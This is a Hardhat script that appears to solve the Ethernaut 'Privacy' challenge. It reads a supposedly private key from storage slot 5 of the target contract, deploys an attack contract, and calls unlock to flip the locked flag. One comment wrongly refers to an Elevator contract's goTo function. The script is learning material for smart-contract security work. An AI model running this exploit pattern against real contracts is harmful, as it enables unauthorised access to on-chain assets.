const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("Privacy");
  const victim = await Victim.attach(
    "0xaA0fD34B187FC8E2D23e02E6DBd19bFC24397Dbd" // This is the contract address that you get from starting your instance
  );

  // Check what the current value of locked is
  const value1 = await victim.locked();
  console.log("The current value of locked is ", value1);

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("PrivacyAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0xaA0fD34B187FC8E2D23e02E6DBd19bFC24397Dbd"
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Call unlock function from attack contract passing the bytes 32 obtained from the right storage position
  const [owner, addr1] = await ethers.getSigners(); // get your account
  const key = await owner.provider.getStorageAt(
    victim.address,
    5 // it is the fifth position of the storage
  );
  const attack = await contract.unlock(key); // this will call the goTo function from Elevator contract
  await attack.wait(1);

  // Verify that the value locked has changed
  const value2 = await victim.locked();
  console.log("The current value of locked is ", value2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
